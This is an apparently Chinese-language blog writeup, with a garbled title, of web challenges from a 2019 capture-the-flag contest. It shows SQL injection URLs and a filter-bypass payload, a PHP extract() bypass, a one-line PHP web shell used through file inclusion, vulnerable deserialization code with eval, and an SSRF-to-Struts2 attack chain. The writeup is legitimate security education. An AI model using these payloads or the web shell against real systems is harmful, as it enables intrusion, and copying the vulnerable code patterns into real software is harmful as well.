<html>

<head>
  <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>ç¬¬äº”ç©ºé—´ç½‘ç»œå®‰å…¨å¤§èµ›Web Writeup | 3ND</title>
<link rel="shortcut icon" href="https://3nd.xyz/favicon.ico?v=1628667956025">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://3nd.xyz/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="ç¬¬äº”ç©ºé—´ç½‘ç»œå®‰å…¨å¤§èµ›Web Writeup | 3ND - Atom Feed" href="https://3nd.xyz/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="
å¦‚ä½•è¯„ä»·2019ç¬¬äº”ç©ºé—´ç½‘ç»œå®‰å…¨åˆ›æ–°èƒ½åŠ›å¤§èµ›çº¿ä¸Šèµ›ï¼Ÿ

ç©ºç›¸ 100pt
param is id ğŸ˜ƒ
# 1.http://111.33.164.4:10001/?id=1%27
param is id :)
Username:admi..." />
    <meta name="keywords" content="SQLi,SSRF,Writeup,CTF" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
    <script src="/media/highlight.min.js"></script>
</head>

<body>
  <div class="main">
    <div class="main-content">
      <div class="site-header">
  <a href="https://3nd.xyz">
  <img class="avatar" src="https://3nd.xyz/images/avatar.png?v=1628667956025" alt="">
  </a>
  <h1 class="site-title">
    3ND
  </h1>
  <p class="site-description">
    å¤ãŒçµ‚ã‚ã£ãŸ
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    <a href="https://github.com/inspiringz" target="_blank">
      <i class="ri-github-fill"></i>
    </a>
    <a href="mailto:z@3nd.xyz" target="_blank">
      <i class="ri-mail-send-fill"></i>
  </a>
  <a href="#">
    <i class="ri-fire-fill"></i>
</a>
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              ç¬¬äº”ç©ºé—´ç½‘ç»œå®‰å…¨å¤§èµ›Web Writeup
            </h2>
            <div class="post-info">
              <span>
                2019-08-30
              </span>
              <span>
                4 min read
              </span>
              <span class="page-view" key="20190830155334" title="ç¬¬äº”ç©ºé—´ç½‘ç»œå®‰å…¨å¤§èµ›Web Writeup">
              </span>
              
                <a href="https://3nd.xyz/tag/sqli/" class="post-tag">
                  # SQLi
                </a>
                
                <a href="https://3nd.xyz/tag/ssrf/" class="post-tag">
                  # SSRF
                </a>
                
                <a href="https://3nd.xyz/tag/writeup/" class="post-tag">
                  # Writeup
                </a>
                
                <a href="https://3nd.xyz/tag/ctf/" class="post-tag">
                  # CTF
                </a>
                
            </div>
            
                <div class="post-content-wrapper">
                  <div class="post-content">
                    <blockquote>
<p><a href="https://www.zhihu.com/question/343194108">å¦‚ä½•è¯„ä»·2019ç¬¬äº”ç©ºé—´ç½‘ç»œå®‰å…¨åˆ›æ–°èƒ½åŠ›å¤§èµ›çº¿ä¸Šèµ›ï¼Ÿ</a></p>
</blockquote>
<h3 id="ç©ºç›¸-100pt">ç©ºç›¸ 100pt</h3>
<p>param is id ğŸ˜ƒ</p>
<pre><code class="language-bash"># 1.http://111.33.164.4:10001/?id=1%27
param is id :)
Username:admin
Password:./25d99be830ad95b02f6f82235c8edcf7.php
# 2.http://111.33.164.4:10001/25d99be830ad95b02f6f82235c8edcf7.php?token=1DJATMVRTTTG8Q00000020PH2SVDPVQ1
flag{88d3e24c2cab001e159de86f8e8e3064}
</code></pre>
<h3 id="äº”å¶-300pt">äº”å¶ 300pt</h3>
<figure data-type="image" tabindex="1"><img src="https://3nd.xyz/post-images/move/2019-08-30-16-03-05.png" alt="" loading="lazy"></figure>
<p>fuzzå¦‚ä¸‹ï¼š</p>
<pre><code class="language-sql"># Wrong! æœªè¿‡æ»¤
' &quot; - # &amp; | ` ~ ! @ ; ,
exp database sleep ascii mid where limit 
# éæ³•å­—ç¬¦ è¿‡æ»¤
* =
and or from 
select union insert update updatexml
</code></pre>
<p>Payload:</p>
<pre><code class="language-sql">' || username like 'admin' -- 
</code></pre>
<p>çŒœæµ‹æŸ¥è¯¢è¯­å¥å¯èƒ½ä¸º:</p>
<pre><code class="language-sql">select * form table_name where password = ('$password')
</code></pre>
<p>å½“æ³¨å…¥å¾—å‡ºçš„<strong>ç¬¬ä¸€æ¡</strong>è®°å½•ä¸º<code>admin</code>æ—¶ï¼Œå›æ˜¾flagä½ç½®ã€‚</p>
<figure data-type="image" tabindex="2"><img src="https://3nd.xyz/post-images/move/2019-08-30-16-05-09.png" alt="" loading="lazy"></figure>
<h3 id="ç©ºæ€§-300pt">ç©ºæ€§ 300pt</h3>
<figure data-type="image" tabindex="3"><img src="https://3nd.xyz/post-images/move/2019-08-30-16-08-28.png" alt="" loading="lazy"></figure>
<p>F12æŸ¥çœ‹æºä»£ç ï¼Œæ³¨æ„åˆ°ä»¥ä¸‹å†…å®¹ï¼š</p>
<pre><code class="language-js">&lt;script language=&quot;javascript&quot;&gt;
      function check(){
        var value = document.getElementById(&quot;txt1&quot;).value; 
        if(!isRightFormat(value)){
          alert(&quot;è´¦æˆ·æˆ–å¯†ç é”™è¯¯ï¼&quot;);
          return false;
        } 
         
		if(!hasRepeatNum(value)){
          alert(&quot;è´¦æˆ·æˆ–å¯†ç é”™è¯¯ï¼&quot;);
          return false;
        } 
		document.write('&lt;center&gt;&lt;br/&gt;&lt;a href=&quot;./151912db206ee052.php&quot;&gt;Welcome to you&lt;/a&gt;');  
      }
       
      function isRightFormat(input){
        return /Youguess$/.test(input);
      }

      function hasRepeatNum(input){
		 return /Youguess$/.test(input);
      } 
    &lt;/script&gt;

</code></pre>
<p><code>./151912db206ee052.php</code> =&gt;å¬è¯´ä½ çš„Linuxç”¨çš„å¾ˆ6ï¼Ÿ=&gt; .151912db206ee052.php.swp(viéæ­£å¸¸é€€å‡ºéšè—æ–‡ä»¶ )</p>
<pre><code class="language-php">//vi -r 151912db206ee052.php
&lt;?php
error_reporting(0);
class First{
  function firstlevel(){
        $a='whoami';
        extract($_GET);
        $fname = $_GET['fname']?$_GET['fname']:'./js/ctf.js';
        $content=trim(file_get_contents($fname));
        if($a==$content)
        {
                echo 'ok';;
        else
        {
                echo 'å¬è¯´ä½ çš„Linuxç”¨çš„å¾ˆ6ï¼Ÿ';
        }
  }
}
$execfirst = new First();
$execfirst -&gt; firstlevel();
?&gt;
</code></pre>
<p>ç®€å•bypassï¼š</p>
<pre><code class="language-bash">http://111.33.164.4:10003/151912db206ee052.php?a=&amp;fname=x
æ¬¢è¿æ‰“å¼€æ–°ä¸–ç•Œçš„å¤§é—¨ï¼
# http://111.33.164.4:10003/2d019a311aaa30427.php?refer=df53ca268240ca76670c8566ee54568a&amp;t=20190828&amp;dtype=computer&amp;file=3792689baaabc7eb&amp;hash256=bfe028187b99faa722cefb30a2aa24d5
</code></pre>
<p>ä¸Šä¼ æ–‡ä»¶ï¼ˆç™½åå•æ ¡éªŒï¼‰å¤„URLå‚æ•°å¦‚ä¸‹ï¼š</p>
<pre><code class="language-bash">refer=df53ca268240ca76670c8566ee54568a //computer
&amp;t=20190828
&amp;dtype=computer
&amp;file=3792689baaabc7eb //æ–‡ä»¶å
&amp;hash256=86bea2686eb3078dcfc93e7b598c8576 //Unixæ—¶é—´æˆ³å“ˆå¸Œ
</code></pre>
<p><code>file=filename</code>å¤„å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œfuzzï¼ˆè„‘æ´ï¼‰å‘ç°å¯ä»¥ä¸Šä¼ <code>.html</code>ï¼Œ=&gt; <code>file=upload/xxxxxxxx</code>(ä¸å«æ–‡ä»¶åç¼€)ï¼Œå³å¯Getshellï¼ŒPayload:</p>
<pre><code class="language-php">&lt;?php $f = $_GET[f]; $f($_GET[s]); ?&gt;
</code></pre>
<h3 id="å…«è‹¦-300pt">å…«è‹¦ 300pt</h3>
<p>tipsï¼šflagåœ¨/var/www/flag.php</p>
<pre><code class="language-php">//http://111.33.164.6:10004/index.phps
&lt;?php
// flag.php in /var/html/www
error_reporting(0);
class Test{
	protected $careful;
	public $securuty;
	public function __wakeup(){
		if($this-&gt;careful===1){
			phpinfo();	// step 1:	read source,get phpinfo and read it carefullt
		}
	}
	public function __get($name){
		return $this-&gt;securuty[$name];
	}
	public function __call($param1,$param2){
		if($this-&gt;{$param1}){
			eval('$a='.$_GET['dangerous'].';');
		}
	}
}
class User{
	public $user;
	public function __wakeup(){
		$this-&gt;user=new Welcome();
		$this-&gt;user-&gt;say_hello();
	}
}
$a=serialize(new User);
$string=$_GET['foo']??$a;
unserialize($string);
?&gt;
</code></pre>
<p>é¢˜ç›®è¢«éƒ¨åˆ†å¸ˆå‚…ä»¬æŒç»­æ…å±ä»¥åï¼Œä¸»åŠæ–¹æ”¾å¼ƒäº†ä¿®å¤æ­¤é¢˜ã€‚ï¼ˆæ®å­¦é•¿æè¿°æ˜¯é€šè¿‡PHP7.4çš„æ–°ç‰¹æ€§è§£å‡º XD</p>
<h3 id="å…­å°˜-500pt">å…­å°˜ 500pt</h3>
<ul>
<li>æ­£è§£</li>
</ul>
<pre><code class="language-bash">SSRFæ‰«æç«¯å£ =&gt; Tomcat 8.0.53:8080 =&gt; Gopheræ”»å‡»å†…ç½‘Struts2
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://3nd.xyz/post-images/move/2019-08-30-16-31-34.png" alt="" loading="lazy"></figure>
<ul>
<li>éé¢„æœŸ</li>
</ul>
<p><code>./log/</code>æ³„éœ²äº†Apacheçš„access.log.txtï¼Œç›´æ¥è®¿é—®è·å–flagã€‚</p>
<pre><code class="language-bash">10.2.4.115 - - [27/Aug/2019:16:24:12 +0000] &quot;GET /flagishere/6be8b547d6db1d213c1ceecc30b3cb24.php?token=1DJ9R32OAQ81NF00000020PHT0AS6V7Usss HTTP/1.1&quot; 200 211 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;
</code></pre>
<h3 id="reference">Reference</h3>
<ul>
<li><a href="http://iv4n.xyz">ğŸ‘ğŸ‘ğŸ‘ Iv4n | JBY</a></li>
</ul>

                  </div>
                  <div class="toc-container">
                    <div style="position: sticky;
                    top: 20px;">
                    <ul class="markdownIt-TOC">
<li>
<ul>
<li>
<ul>
<li><a href="#%E7%A9%BA%E7%9B%B8-100pt">ç©ºç›¸ 100pt</a></li>
<li><a href="#%E4%BA%94%E5%8F%B6-300pt">äº”å¶ 300pt</a></li>
<li><a href="#%E7%A9%BA%E6%80%A7-300pt">ç©ºæ€§ 300pt</a></li>
<li><a href="#%E5%85%AB%E8%8B%A6-300pt">å…«è‹¦ 300pt</a></li>
<li><a href="#%E5%85%AD%E5%B0%98-500pt">å…­å°˜ 500pt</a></li>
<li><a href="#reference">Reference</a></li>
</ul>
</li>
</ul>
</li>
</ul>

                  </div>
                  </div>
                </div>
          </article>
        </div>

        
          <div class="nearby-post" style="padding: 24px 32px;">
            <div class="prev-post" style="float: left;">
              <div class="aaa" style="
              margin-bottom: 24px;
              color: #343a40;
              font-weight: lighter;text-align: left;">ä¸Šä¸€ç¯‡</div>
              <a href="https://3nd.xyz/post/2019-08-31-xxe-learning-note/">
                <h3 class="post-title" style="text-align: left;">
                  XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ä¸åˆ©ç”¨å­¦ä¹ 
                </h3>
              </a>
            </div>
            <div class="next-posts" style="float: right;">
              <div class="aaa" style="
              margin-bottom: 24px;
              color: #343a40;
              font-weight: lighter; text-align: right;">ä¸‹ä¸€ç¯‡</div>
              <a href="https://3nd.xyz/post/2019-08-23-2019-De1taCTF/">
                <h3 class="post-title" style="
                text-align: right;">
                  De1ta CTF 2019 Web Writeup
                </h3>
              </a>
            </div>
          </div>
          

                

                                <div class="site-footer">
  
  <a class="rss" href="https://3nd.xyz/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

    </div>
  </div>

  <script>
    hljs.highlightAll();

    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

    // This should probably be throttled.
    // Especially because it triggers during smooth scrolling.
    // https://lodash.com/docs/4.17.10#throttle
    // You could do like...
    // window.addEventListener("scroll", () => {
    //    _.throttle(doThatStuff, 100);
    // });
    // Only not doing it here to keep this Pen dependency-free.

    window.addEventListener("scroll", event => {
      let fromTop = window.scrollY;

      mainNavLinks.forEach((link, index) => {
        let section = document.getElementById(decodeURI(link.hash).substring(1));
        let nextSection = null
        if (mainNavLinks[index + 1]) {
          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
        }
        if (section.offsetTop <= fromTop) {
          if (nextSection) {
            if (nextSection.offsetTop > fromTop) {
              link.classList.add("current");
            } else {
              link.classList.remove("current");
            }
          } else {
            link.classList.add("current");
          }
        } else {
          link.classList.remove("current");
        }
      });
    });
  </script>
<script src="/media/view-support.js"></script>
<script>
  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
    var pageview = window.pageview(AV, {
      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
      appClass: 'Gridea',
    });
    $('.page-view').each(function () {
      var $this = $(this);
      var key = $this.attr('key');
      var title = $this.attr('title');
      pageview.increase(key, title, function(view) {
        $("[key='" + key +"']").text(view+' views');
      });
    });
  });
</script>

</body>

</html>